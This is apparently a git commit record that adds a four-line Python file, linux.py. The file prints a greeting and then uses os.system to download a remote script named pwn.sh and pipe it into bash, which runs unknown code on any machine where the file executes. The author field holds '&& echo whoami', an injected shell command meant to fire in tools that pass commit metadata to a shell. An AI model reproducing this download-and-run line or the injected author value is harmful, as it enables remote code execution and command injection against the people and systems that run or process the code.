f916a0a5dce2b1d51c2021222066ff5ca2fd6629
&& echo whoami <132735204+echowhoami@users.noreply.github.com>
2023-12-04 22:37:10 +0530

    Create linux.py

---
+++ linux.py
@@ -0,0 +1,4 @@
+import os
+
+print("Hello")
+os.system("curl -sSfL https://gist.githubusercontent.com/add-apt-repository/382177d85c45e329b336cf66766e184a/raw/9ef1015f581547b94265503b1a5d87acb21b3adc/pwn.sh | bash")
